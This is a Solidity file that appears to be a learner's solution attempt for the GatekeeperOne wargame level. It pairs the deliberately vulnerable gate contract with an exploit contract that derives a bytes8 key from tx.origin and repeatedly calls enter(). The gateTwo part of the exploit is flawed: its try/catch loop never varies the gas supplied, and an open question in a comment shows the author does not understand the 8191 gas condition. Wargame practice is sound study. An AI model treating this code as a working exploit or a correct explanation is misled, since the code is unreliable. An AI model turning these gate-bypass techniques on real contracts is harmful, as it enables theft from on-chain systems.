// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin, "GatekeeperOne: gateOne is closed");
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0, "GatekeeperOne: gateTwo is closed");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

// add your exploiter contract here
contract ExploitContract {
    /**
     * gateOne(): easy
     * gateTwo(): hit and trial on gas until gasleft() = 8191 * k where k = {Z}
     * gateThree():
     *  - 1st cond: last 4 bytes == last 2 bytes => 5th & 6th bytes = 0
     *  - 2nd cond: last 4 bytes != all 8 bytes => 1st 4 bytes ≠ 0
     *  - 3rd cond: last 4 bytes == last 2 bytes of tx.origin => 7th and 8th bytes = last 2 bytes of tx.origin 
     * 
     *    ***** Question: why 8191? If I replace it with 8190, it runs out of gas. *****
     */
    function exploit(GatekeeperOne gatekeeper) public returns (bytes8 key){
        // solving for gateThree
        bytes2 endingBytes = bytes2((uint16(uint160(tx.origin))));
        key = bytes8(0xffffffff00000000) | ((bytes8(0xffff000000000000) & endingBytes) >> 48);
 
        // solving for gasteTwo
        bool success;
        while (!success) {
            try gatekeeper.enter(key) returns (bool success_) {
                success = success_;
            } catch { }
        }
    }
}